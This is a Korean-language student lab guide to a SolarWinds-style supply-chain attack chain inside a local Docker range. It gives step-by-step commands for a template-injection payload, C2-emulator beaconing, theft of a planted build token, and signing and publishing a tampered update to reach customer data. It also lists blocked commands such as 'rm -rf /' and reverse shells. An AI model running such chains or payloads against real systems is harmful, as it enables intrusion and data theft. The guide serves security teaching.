# Orion Echo 공격 체인 실습 설명서

대상: 대학생 / 초급 보안 실습자  
환경: WSL Ubuntu 24.04 + Docker Compose  
범위: 로컬 Docker 실습망 전용

---

## 0. 먼저 꼭 알아야 할 것

이 문서의 명령어는 **실제 기업망을 공격하기 위한 명령어가 아닙니다.**

이 실습은 우리가 만든 로컬 Docker 환경 안에서만 동작하도록 설계된
공급망 공격 시나리오입니다.

```text
공격 대상:
로컬 Docker Compose 실습망

진입점:
http://localhost:8080

실습 위치:
/home/ubuntu/orion-echo-demo

금지:
실제 사이트, 실제 회사, 외부 서버에 같은 절차를 시도하지 말 것
```

이 실습의 핵심 목표는 SolarWinds 사건을 모티브로 한 공급망 공격 흐름을
이해하는 것입니다.

```text
정찰
-> 공개 서비스 취약점
-> 제한된 foothold
-> C2 개념 에뮬레이션
-> 내부 문서/레포 탐색
-> 토큰 발견
-> 빌드/서명/배포 체인
-> 고객 업데이트 신뢰 관계
-> 고객 데이터 수집
```

---

## 1. 실습 환경 실행

Windows PowerShell에서 WSL Ubuntu로 들어갑니다.

```powershell
wsl -d Ubuntu-24.04
```

WSL 안에서 프로젝트 디렉토리로 이동합니다.

```bash
cd /home/ubuntu/orion-echo-demo
```

Docker Compose로 실습망을 실행합니다.

```bash
docker compose up --build -d
```

컨테이너 상태를 확인합니다.

```bash
docker compose ps
```

정상이라면 `edge-proxy`, `support-portal`, `wiki`, `build-server`,
`signing-service`, `update-server`, `customer-app`, `customer-api`,
`object-store`, `c2-emulator`, `audit-log` 등이 `Up` 상태여야 합니다.

브라우저 또는 curl로 외부 진입점을 확인합니다.

```bash
curl http://localhost:8080/
```

---

## 2. 전체 공격 흐름 요약

| 단계 | 공격자 행동 | MITRE ATT&CK |
|---|---|---|
| 1 | 공개 웹/문서 정찰 | `T1591`, `T1592.002` |
| 2 | support-portal preview 취약점 사용 | `T1190` |
| 3 | 제한된 명령 실행으로 foothold 확인 | `T1059.004`, `T1082`, `T1083` |
| 4 | C2 emulator beacon 등록 | `T1071.001` |
| 5 | 내부 서비스 탐색 | `T1046` |
| 6 | wiki/ticket/repo에서 단서 수집 | `T1213`, `T1213.003` |
| 7 | build token 발견 및 사용 | `T1552`, `T1550.001` |
| 8 | 빌드 artifact 생성 | `T1608` |
| 9 | 서명 후 ANRC 업데이트 채널 publish | `T1195.002`, `T1072` |
| 10 | 고객 앱이 trusted update 적용 | `T1072`, `T1105`, `T1570` |
| 11 | 고객 API와 object-store에서 최종 데이터 수집 | `T1530` |

---

## 3. Stage 0 - 외부 정찰

### 목적

공격자는 바로 취약점을 때리지 않습니다. 먼저 회사, 제품, 고객,
버전, 업데이트 채널을 파악합니다.

### 사용 도구

```text
curl
브라우저
```

### 명령어

```bash
curl http://localhost:8080/
```

예상되는 내용:

```text
Orion Echo Systems LLC
EchoAgent
EchoUpdate
Al Noor Research Campus
```

공개 문서도 확인합니다.

```bash
curl http://localhost:8080/docs/
```

공개 릴리즈 정보를 확인합니다.

```bash
curl http://localhost:8080/docs/releases/public
```

서비스 메타데이터를 확인합니다.

```bash
curl http://localhost:8080/service/build-info
```

정상 결과 예시:

```json
{
  "git_sha": "demoabcdef",
  "built_at": "2026-05-02T00:00:00Z",
  "service_account": "public-site-svc",
  "flag": "orion{demo_recon_context_001}"
}
```

### 여기서 배울 점

```text
공개 문서와 메타데이터만으로도 제품명, 버전, 고객명,
업데이트 채널 같은 중요한 공격 단서를 얻을 수 있다.
```

---

## 4. Stage 1 - 공개 서비스 취약점으로 초기 접근

### 목적

`support-portal`의 preview 기능에 의도적으로 만든 실습용 취약점을 사용해
초기 foothold marker를 읽습니다.

### MITRE

```text
T1190 Exploit Public-Facing Application
T1059.004 Command and Scripting Interpreter: Unix Shell
```

### 중요한 안전 경계

이 실습은 실제 임의 명령 실행을 허용하지 않습니다.  
`support-portal`에는 lab guard가 있어서 허용된 명령만 실행됩니다.

허용되는 예:

```text
id
hostname
ls /opt/support-portal
cat /var/lib/support-portal/.post_exploit_marker
cat /tmp/orion_stage2.txt
```

허용되지 않는 예:

```text
rm -rf /
curl 외부주소
nc
bash reverse shell
```

### 명령어

```bash
curl -sS -X POST http://localhost:8080/support/preview \
  -H "Content-Type: application/json" \
  -d '{"body":"{{orion_exec:cat /var/lib/support-portal/.post_exploit_marker}}"}'
```

정상 결과 예시:

```json
{
  "preview": "You executed: support@<container-hostname>\nYour demo: orion-demo-001\nFlag: orion{demo_initial_access_001}\nHint: register a beacon at http://c2-emulator:8000/beacon/register\n",
  "lab_guard": "allowed"
}
```

### 여기서 배울 점

```text
공개 서비스 취약점은 최종 목표가 아니라 내부로 들어가기 위한 시작점이다.
```

---

## 5. Stage 2 - Foothold 확인과 내부 방향 잡기

### 목적

초기 접근 후에는 현재 권한, 호스트, 파일 구조를 확인합니다.

### MITRE

```text
T1082 System Information Discovery
T1083 File and Directory Discovery
```

### 명령어

현재 사용자 확인:

```bash
curl -sS -X POST http://localhost:8080/support/preview \
  -H "Content-Type: application/json" \
  -d '{"body":"{{orion_exec:id}}"}'
```

호스트명 확인:

```bash
curl -sS -X POST http://localhost:8080/support/preview \
  -H "Content-Type: application/json" \
  -d '{"body":"{{orion_exec:hostname}}"}'
```

서비스 디렉토리 확인:

```bash
curl -sS -X POST http://localhost:8080/support/preview \
  -H "Content-Type: application/json" \
  -d '{"body":"{{orion_exec:ls /opt/support-portal}}"}'
```

Stage 2 flag 확인:

```bash
curl -sS -X POST http://localhost:8080/support/preview \
  -H "Content-Type: application/json" \
  -d '{"body":"{{orion_exec:cat /tmp/orion_stage2.txt}}"}'
```

정상 결과 예시:

```text
Flag: orion{demo_foothold_execution_001}
Technique: T1082/T1083
```

### 여기서 배울 점

```text
초기 접근 후 바로 다음 시스템을 공격하는 것이 아니라,
현재 실행 환경을 파악하고 이동 경로를 찾는다.
```

---

## 6. Stage 3 - C2 Emulator 등록

### 왜 여기부터 docker compose exec를 쓰는가?

`c2-emulator`, `wiki`, `build-server` 같은 내부 서비스는 외부 브라우저에서
직접 접근할 수 없습니다.

이것이 기업망 분리 구조입니다.

```text
외부 사용자 -> edge-proxy/support-portal만 접근 가능
support-portal foothold -> 내부 서비스 접근 가능
```

따라서 실습에서는 `support-portal` 컨테이너 내부에서 명령을 실행해
foothold 관점을 재현합니다.

### 명령어

```bash
docker compose exec -T support-portal python -c '
import httpx, json
res = httpx.post("http://c2-emulator:8000/beacon/register", json={
    "host": "support-portal",
    "reachable_targets": ["wiki", "ticket-service", "source-repo", "build-server", "update-server", "customer-api"]
})
print(json.dumps(res.json(), indent=2))
'
```

정상 결과 예시:

```json
{
  "implant_id": "...",
  "registered_at": "...",
  "actions_endpoint": "/beacon/.../actions",
  "flag": "orion{demo_c2_emulator_001}"
}
```

### 여기서 배울 점

```text
C2는 공격자가 foothold를 관리하는 개념이다.
이 실습에서는 실제 C2 대신 안전한 HTTP 기반 emulator만 사용한다.
```

---

## 7. Stage 4 - 내부 서비스 탐색

### 목적

내부망에 어떤 서비스가 있는지 파악합니다.

### MITRE

```text
T1046 Network Service Discovery
```

### 명령어

```bash
docker compose exec -T support-portal python -c '
import httpx, json
res = httpx.get("http://c2-emulator:8000/discover/services")
print(json.dumps(res.json(), indent=2))
'
```

정상 결과 예시:

```json
{
  "services": [
    "wiki.corp.local",
    "tickets.corp.local",
    "git.dev.local",
    "build.dev.local",
    "signing.release.local",
    "updates.release.local",
    "api.anrc.customer.local"
  ],
  "flag": "orion{demo_internal_discovery_001}"
}
```

### 여기서 배울 점

```text
공격자는 내부망에서 다음 목표를 찾기 위해 서비스 이름,
역할, 네트워크 위치를 파악한다.
```

---

## 8. Stage 5 - 내부 Wiki에서 Build Token 찾기

### 목적

공급망 공격의 핵심으로 가기 위해 build-server를 사용할 토큰을 찾습니다.

### MITRE

```text
T1213 Data from Information Repositories
T1552 Unsecured Credentials
```

### 명령어

```bash
docker compose exec -T support-portal python -c '
import httpx, json
res = httpx.get("http://wiki:8000/pages/release/runbook-build-trigger")
print(json.dumps(res.json(), indent=2))
'
```

중요 단서:

```text
BUILD_TRIGGER_TOKEN=build-trigger-demo-7f3a91
TARGET_CHANNEL=anrc
```

관련 ticket도 확인합니다.

```bash
docker compose exec -T support-portal python -c '
import httpx, json
res = httpx.get("http://ticket-service:8000/tickets/OES-1287")
print(json.dumps(res.json(), indent=2))
'
```

관련 repo 설정도 확인합니다.

```bash
docker compose exec -T support-portal python -c '
import httpx, json
res = httpx.get("http://source-repo:8000/files/release-pipeline/release.json")
print(json.dumps(res.json(), indent=2))
'
```

### 여기서 배울 점

```text
실제 기업 환경에서는 wiki, ticket, repo, 문서에 운영 단서가 남아 있다.
공격자는 유효한 단서와 decoy를 구분해야 한다.
```

---

## 9. Stage 6 - Build Token으로 빌드 작업 실행

### 목적

발견한 token을 사용해 build-server에 빌드 작업을 요청합니다.

### MITRE

```text
T1550.001 Use Alternate Authentication Material: Application Access Token
T1608 Stage Capabilities
```

### 명령어

```bash
docker compose exec -T support-portal python -c '
import httpx, json
res = httpx.post("http://build-server:8000/api/jobs", json={
    "repo": "orionecho/echo-agent",
    "ref": "refs/heads/release/2.6.4",
    "channel": "anrc",
    "trigger_token": "build-trigger-demo-7f3a91"
})
print(json.dumps(res.json(), indent=2))
'
```

정상 결과 예시:

```json
{
  "job_id": "build-2026-0502-001",
  "status": "published",
  "artifact_id": "art-demo-001",
  "x_orion_acceptance": "orion{demo_build_token_001}",
  "logs_url": "/api/jobs/build-2026-0502-001/logs"
}
```

artifact 메타데이터 확인:

```bash
docker compose exec -T support-portal python -c '
import httpx, json
res = httpx.get("http://build-server:8000/api/artifacts/art-demo-001")
print(json.dumps(res.json(), indent=2))
'
```

### 여기서 배울 점

```text
탈취한 토큰 자체가 목적이 아니라, 그 토큰으로 신뢰된 빌드 파이프라인을
움직이는 것이 공급망 공격의 핵심이다.
```

---

## 10. Stage 7 - Manifest 서명과 ANRC 채널 Publish

### 목적

빌드 artifact를 고객 업데이트 채널로 배포할 수 있도록 manifest를 서명하고
ANRC 채널에 publish합니다.

### MITRE

```text
T1195.002 Supply Chain Compromise: Compromise Software Supply Chain
T1072 Software Deployment Tools
```

### 간단 실습 명령

이 실습에는 교육 진행을 쉽게 하기 위한 helper endpoint가 있습니다.
이 endpoint는 아래 과정을 한 번에 수행합니다.

```text
artifact metadata 확인
-> canonical manifest 생성
-> signing-service 서명 요청
-> update-server /internal/publish 호출
```

명령어:

```bash
docker compose exec -T support-portal python -c '
import httpx, json
res = httpx.get("http://build-server:8000/demo/sign-and-publish")
print(json.dumps(res.json(), indent=2))
'
```

정상 결과에서 확인할 부분:

```text
channel: anrc
version: 2.6.4
metadata.lab_marker: ORION_ECHO_BUILD_MARKER=orion-demo-001
signature.kid: orion-lab-signing-key
```

publish된 manifest 직접 확인:

```bash
docker compose exec -T support-portal python -c '
import httpx, json
res = httpx.get("http://update-server:8000/channels/anrc/manifest.json")
print(json.dumps(res.json(), indent=2))
'
```

### 여기서 배울 점

```text
SolarWinds형 공급망 공격의 핵심은 고객을 직접 공격하는 것이 아니라,
고객이 신뢰하는 소프트웨어 업데이트 경로를 악용하는 것이다.
```

---

## 11. Stage 8 - 고객 앱이 Trusted Update 적용

### 목적

ANRC 고객 환경의 `customer-app`이 update-server에서 새 manifest를 가져와
서명과 hash를 검증한 뒤 업데이트를 적용하는 과정을 확인합니다.

### MITRE

```text
T1072 Software Deployment Tools
T1105 Ingress Tool Transfer
T1570 Lateral Tool Transfer
```

### 명령어

```bash
docker compose exec -T support-portal python -c '
import httpx, json
res = httpx.post("http://customer-app:8000/api/poll-now")
print(json.dumps(res.json(), indent=2))
'
```

정상 결과:

```json
{
  "applied": true,
  "customer_api": {
    "accepted": true,
    "recent_event_flag": "orion{demo_customer_reach_001}"
  }
}
```

고객 API metadata 확인:

```bash
docker compose exec -T support-portal python -c '
import httpx, json
res = httpx.get("http://customer-api:8000/metadata")
print(json.dumps(res.json(), indent=2))
'
```

### 여기서 배울 점

```text
공격자는 고객 API 토큰을 직접 훔친 것이 아니라,
벤더 업데이트 신뢰 관계를 통해 고객 환경까지 도달했다.
```

---

## 12. Stage 9 - 고객 API에서 Export 탐색

### 목적

고객 환경에 도달한 뒤, 어떤 데이터 export가 있는지 확인합니다.

### MITRE

```text
T1213 Data from Information Repositories
```

### 명령어

```bash
docker compose exec -T support-portal python -c '
import httpx, json
for path in ["/metadata", "/facilities", "/audits", "/exports"]:
    res = httpx.get("http://customer-api:8000" + path)
    print("\\n##", path)
    print(json.dumps(res.json(), indent=2))
'
```

특정 export 상세 확인:

```bash
docker compose exec -T support-portal python -c '
import httpx, json
res = httpx.get("http://customer-api:8000/exports/exp-2026-Q2-007")
print(json.dumps(res.json(), indent=2))
'
```

중요 필드:

```text
object_key
presigned_url
x_orion_discovery_flag
```

### 여기서 배울 점

```text
최종 데이터에 바로 접근하기 전에 API metadata와 export 목록을 탐색해
정확한 object key를 찾아야 한다.
```

---

## 13. Stage 10 - Object Store에서 최종 데이터 수집

### 목적

customer-api가 제공한 presigned URL을 사용해 최종 ANRC audit export를
가져옵니다.

### MITRE

```text
T1530 Data from Cloud Storage
```

### 명령어

```bash
docker compose exec -T support-portal python -c '
import httpx
detail = httpx.get("http://customer-api:8000/exports/exp-2026-Q2-007").json()
print(httpx.get(detail["presigned_url"]).text)
'
```

정상 결과:

```text
Operation Orion Echo - End of Range
session: orion-demo-001
final_flag: orion{demo_final_anrc_object_001}
```

### 여기서 배울 점

```text
공급망 공격 체인의 최종 목표는 단순 침투가 아니라,
신뢰 관계를 따라가서 중요한 고객 데이터를 수집하는 것이다.
```

---

## 14. 전체 자동 검증 스크립트

위 과정을 한 번에 검증하려면 아래 스크립트를 사용합니다.

```bash
docker compose exec -T support-portal sh -c "cat > /tmp/verify_chain.py" < scripts/verify_chain.py
docker compose exec -T support-portal python /tmp/verify_chain.py
```

정상이라면 마지막에 다음이 나옵니다.

```text
final_flag: orion{demo_final_anrc_object_001}
Audit count
```

---

## 15. Audit Log 확인

공격 행위가 어떤 MITRE 기법으로 기록됐는지 확인합니다.

```bash
docker compose exec -T support-portal python -c '
import httpx, json
events = httpx.get("http://audit-log:8000/events").json()
print(json.dumps(events, indent=2))
'
```

예상되는 주요 이벤트:

```text
support.exploit.preview_triggered      T1190
support.post_exploit.command_allowed   T1059.004
c2.beacon.registered                   T1071.001
c2.discovery.service_probe             T1046
wiki.page.viewed                       T1552
repo.file.viewed                       T1213.003
api.token.accepted                     T1550.001
build.artifact.created                 T1608
release.manifest.published             T1195.002
customer.update.applied                T1072
object.final.downloaded                T1530
```

---

## 16. 수업에서 설명할 핵심 메시지

이 실습을 한 문장으로 정리하면:

```text
공급망 공격은 단일 취약점 공격이 아니라,
정찰, 초기 접근, 내부 정보 수집, 토큰 사용, 빌드/서명/배포 시스템,
고객 신뢰 관계, 최종 데이터 수집이 연결된 공격 체인이다.
```

SolarWinds 사건과 연결해서 강조할 부분:

```text
고객을 직접 공격하지 않아도,
고객이 신뢰하는 벤더의 소프트웨어 업데이트 경로가 악용되면
고객 환경까지 영향이 전파될 수 있다.
```

이 실습에서 안전하게 제한한 부분:

```text
실제 악성코드 없음
실제 외부 C2 없음
실제 임의 명령 실행 없음
Docker host escape 없음
파괴 행위 없음
artifact는 marker만 담은 benign tarball
```
